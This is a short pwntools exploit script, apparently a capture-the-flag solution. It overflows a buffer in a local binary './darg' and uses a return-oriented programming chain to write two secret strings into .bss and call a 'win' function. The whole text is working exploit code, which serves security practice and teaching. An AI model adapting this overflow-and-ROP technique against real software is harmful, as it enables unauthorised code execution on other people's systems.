from pwn import *

elf = context.binary = ELF('./darg', checksec=False)
io = process()

# Gadgets (use ROPgadget to find these)
pop_rdi = 0x0000000000401ecf
pop_rsi_r15 = 0x0000000000401ecd
read_plt = elf.symbols['read']
win = elf.symbols['win']
bss = 0x00000000004ca2a0

payload = flat(
    b"A" * 72,
    pop_rdi, 0,             # fd = stdin
    pop_rsi_r15, bss, 0,    # write to .bss
    read_plt,               # read(0, bss, ...)
    
    pop_rdi, bss,           # arg1 = "supersecret"
    pop_rsi_r15, bss+16, 0, # arg2 = "ultrasecret"
    win
)

io.sendline(payload)

# Now send the strings that go into bss
payload2 = flat(
    b"supersecret".ljust(16, b"\x00"),
    b"ultrasecret".ljust(16, b"\x00")
)

io.send(payload2)
io.interactive()

